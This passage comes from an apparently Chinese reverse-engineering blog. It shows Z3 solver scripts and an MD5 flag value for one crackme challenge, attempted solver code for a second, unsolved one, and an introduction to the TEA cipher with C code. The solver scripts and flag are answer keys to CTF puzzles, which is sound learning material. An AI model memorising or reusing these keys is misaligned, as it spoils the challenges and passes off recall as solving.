* 50 - a14 * 9 == 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 == 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 == 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 == 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 == 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317):<br>    print(&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;)<br>    print(&#x27;Congratulations and have fun!&#x27;)<br>else:<br>    print(&#x27;Sorry,plz try again...&#x27;)<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这里的(a8 &lt;&lt; 7)要改成(a8 * 0x80)，不然会报错</p><p><font style="color:#DF2A3F;">在Python中，使用左移操作符 </font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;&lt;&lt;&lt;/font&gt;</code><font style="color:#DF2A3F;"> 可以将数值按位左移。然而，在Z3中，左移操作符 </font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;&lt;&lt;&lt;/font&gt;</code><font style="color:#DF2A3F;"> 是不支持的。因此，需要将左移操作转换为等效的乘法操作。</font></p><p><font style="color:#DF2A3F;">左移7位相当于乘以 2的7次，也就是128。因此，</font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;a8 &lt;&lt; 7&lt;/font&gt;</code><font style="color:#DF2A3F;"> 等价于 </font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;a8 * 128&lt;/font&gt;</code><font style="color:#DF2A3F;"> 或 </font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;a8 * 0x80&lt;/font&gt;</code></p><p><img src="/./img/49277317_OcNrDgdRnL7OC6p2/1721791003971-2f81c425-cc6d-4e8b-b0ee-7b1813dccafc-758946.png" alt="1721791003971-2f81c425-cc6d-4e8b-b0ee-7b1813dccafc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">from z3 import *<br><br>a1 = Int(&#x27;a2&#x27;)<br>a2 = Int(&#x27;a1&#x27;)<br>a3 = Int(&#x27;a0&#x27;)<br>a4 = Int(&#x27;a3&#x27;)<br>a5 = Int(&#x27;a4&#x27;)<br>a6 = Int(&#x27;a5&#x27;)<br>a7 = Int(&#x27;a6&#x27;)<br>a8 = Int(&#x27;a7&#x27;)<br>a9 = Int(&#x27;a9&#x27;)<br>a10 = Int(&#x27;a8&#x27;)<br>a11 = Int(&#x27;a10&#x27;)<br>a12 = Int(&#x27;a11&#x27;)<br>a13 = Int(&#x27;a12&#x27;)<br>a14 = Int(&#x27;a13&#x27;)<br><br>s = Solver()<br><br>s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)<br>s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)<br>s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)<br>s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 * 0x80) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)<br>s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)<br>s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)<br>s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)<br>s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)<br>s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)<br>s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)<br>s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)<br>s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)<br>s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)<br>s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)<br><br>if &#x27;un&#x27; not in str(s.check()):<br>    print(s.model())<br></code></pre></td></tr></table></figure><p>根据输出创建字典</p><p><img src="/./img/49277317_OcNrDgdRnL7OC6p2/1721791302249-cb278161-cf5d-4c14-a1bf-4cc96250a6d6-077345.png" alt="1721791302249-cb278161-cf5d-4c14-a1bf-4cc96250a6d6.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs plain">from z3 import *<br><br>a1 = Int(&#x27;a2&#x27;)<br>a2 = Int(&#x27;a1&#x27;)<br>a3 = Int(&#x27;a0&#x27;)<br>a4 = Int(&#x27;a3&#x27;)<br>a5 = Int(&#x27;a4&#x27;)<br>a6 = Int(&#x27;a5&#x27;)<br>a7 = Int(&#x27;a6&#x27;)<br>a8 = Int(&#x27;a7&#x27;)<br>a9 = Int(&#x27;a9&#x27;)<br>a10 = Int(&#x27;a8&#x27;)<br>a11 = Int(&#x27;a10&#x27;)<br>a12 = Int(&#x27;a11&#x27;)<br>a13 = Int(&#x27;a12&#x27;)<br>a14 = Int(&#x27;a13&#x27;)<br><br>s = Solver()<br><br>s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)<br>s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)<br>s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)<br>s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 * 0x80) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)<br>s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)<br>s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)<br>s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)<br>s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)<br>s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)<br>s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)<br>s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)<br>s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)<br>s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)<br>s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)<br><br>if &#x27;un&#x27; not in str(s.check()):<br>    print(s.model())<br><br>direct=&#123;<br>    13 : 33,<br>    3 : 7,<br>    4 : 104,<br>    10 : 88,<br>    12 : 88,<br>    1 : 24,<br>    7 : 91,<br>    9 : 52,<br>    6 : 28,<br>    5 : 43,<br>    0 : 10,<br>    8 : 108,<br>    2 : 119,<br>    11 : 74<br>&#125;<br>flag=[0 for i in range(15)]<br>for i in direct:<br>    flag[i]=direct[i]<br><br>for i in range(13,-1,-1):<br>    flag[i]^=flag[i+1]<br><br>for  i in range(14):<br>    print(chr(flag[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_OcNrDgdRnL7OC6p2/1721791549516-6b414aa8-6fec-4e08-8b64-15086e37809c-948813.png" alt="1721791549516-6b414aa8-6fec-4e08-8b64-15086e37809c.png"></p><p>最后进行md5加密</p><p>58964088b637e50d3a22b9510c1d1ef8</p><h2 id="2、babe-ze3（不会）"><a href="#2、babe-ze3（不会）" class="headerlink" title="2、babe-ze3（不会）"></a>2、babe-ze3（不会）</h2><p><img src="/./img/49277317_OcNrDgdRnL7OC6p2/1726988449299-2134c22d-c2a5-4353-8577-a74dafbacf54-816805.png" alt="1726988449299-2134c22d-c2a5-4353-8577-a74dafbacf54.png"></p><p>网站Hint最后一个if有问题，狗屁通说v4和  !(_DWORD)v4无法同时成立</p><p>之前Z3解密用的都是Ints类型，这次运算有变，变成<font style="color:rgb(38, 38, 38);background-color:rgb(245, 245, 245);">BitVec()位向量</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plain">from libnum import n2s<br>from z3 import *<br>from Crypto.Util.number import *<br><br># 定义变量<br>s = BitVec(&#x27;s&#x27;, 64)<br>v6 = BitVec(&#x27;v6&#x27;, 64)<br>v7 = BitVec(&#x27;v7&#x27;, 64)<br>v8 = BitVec(&#x27;v8&#x27;, 64)<br>solver = Solver()<br><br># 添加条件<br>solver.add((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == 0x2024243035302131)<br>solver.add((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == 0x7071001344417B54)<br>solver.add(((v7 - v8) ^ (s - v6)) == 0x3FE01013130FFD3)<br>solver.add((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == 0x1989A41A9049C5C9)<br>solver.add((v7 + v6 + s + v8) % 0x1BF52 == 21761)<br>solver.add(v8 * v7 * v6 * s % 0x1D4B42 == 827118)<br><br># 检查是否有解<br>if solver.check() == sat:<br>    model = solver.model()<br><br>    # 输出变量的解<br>    s_val = model[s].as_long()<br>    v6_val = model[v6].as_long()<br>    v7_val = model[v7].as_long()<br>    v8_val = model[v8].as_long()<br><br>    # 将解转换为字符串<br>    print(&quot;s:&quot;, n2s(s_val))<br>    print(&quot;v6:&quot;, n2s(v6_val))<br>    print(&quot;v7:&quot;, n2s(v7_val))<br>    print(&quot;v8:&quot;, n2s(v8_val))<br>else:<br>    print(&quot;No solution found&quot;)<br><br># 处理字符串翻转<br>s = &#x27;cd5250c9dbc4fdab1760517947e35495&#x27;<br>s1 = &#x27;&#x27;<br>for i in range(0, 32, 8):<br>    a = s[i:i+8]<br>    a = a[::-1]  # 翻转每个8字符的子串<br>    s1 += a<br><br>print(&quot;Processed string:&quot;, s1)<br># 结果应为: 9c0525dcba4fdfbd9715067159453e74<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-06-03 19:20:35<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rtbffu0uqgr3h5m3">https://www.yuque.com/chaye-apqbl/vsc85q/rtbffu0uqgr3h5m3</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/TEA/"/>
    <url>/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/TEA/</url>
    
    <content type="html"><![CDATA[<h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i;           <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <span class="hljs-comment">/* a key schedule constant */</span><br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <span class="hljs-comment">/* cache key */</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                       <span class="hljs-comment">/* basic cycle start */</span><br>        sum += delta;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);  <br>    &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i;  <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <span class="hljs-comment">/* a key schedule constant */</span><br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <span class="hljs-comment">/* cache key */</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;                         <span class="hljs-comment">/* basic cycle start */</span><br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        sum -= delta;                                   <br>    &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.87);">在 Tea 算法中其最主要的识别特征就是 拥有一个 magic number ：0x9e3779b9 。当然，这 Tea 算法也有魔改的，感兴趣的可以看 2018 0ctf Quals milk-tea。</font></p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a><font style="color:rgba(0, 0, 0, 0.87);">概念</font></h1><p>解析 TEA 加密算法(C语言、python)：</p><p>TEA系列概述：</p><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)&#x2F;2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><h2 id="TEA-加密："><a href="#TEA-加密：" class="headerlink" title="TEA 加密："></a>TEA 加密：</h2><p>TEA算法介绍：</p><p>TEA 采用与 DES 算法类似的 Feistel 结构，迭代的每次循环使用加法和移位操作，对明文和密钥进行扩散和混乱，实现明文的非线性变换。TEA 密钥长度和迭代次数都是 DES 的两倍，抗“试错法”攻击的强度不低于 DES 算法。算法以32bits 的字为运算单位，而不是耗费计算能力的逐位运算。算法没有采用 DES 那样的转换矩阵，它安全、高效、占用存储空间少，非常适合在嵌入式系统中应用, 据说 QQ 就是使用 16 轮迭代的 TEA 算法。</p><p>加密过程：(解密过程逆过来即可)</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1731483334148-b86d80a7-758e-4958-954e-c1f769b059cf-849511.png" alt="1731483334148-b86d80a7-758e-4958-954e-c1f769b059cf.png"></p><h3 id="c脚本"><a href="#c脚本" class="headerlink" title="c脚本"></a>c脚本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v,<span class="hljs-type">uint32_t</span> *k )</span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0</span>,i;<br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>        sum+=delta;<br>        v0+=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        v1+=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>    &#125; <br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v,<span class="hljs-type">uint32_t</span> *k)</span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0xC6EF3720</span>,i;  <span class="hljs-comment">//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。</span><br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        sum-=delta;<br>    &#125; <br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;,k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">2</span>,<span 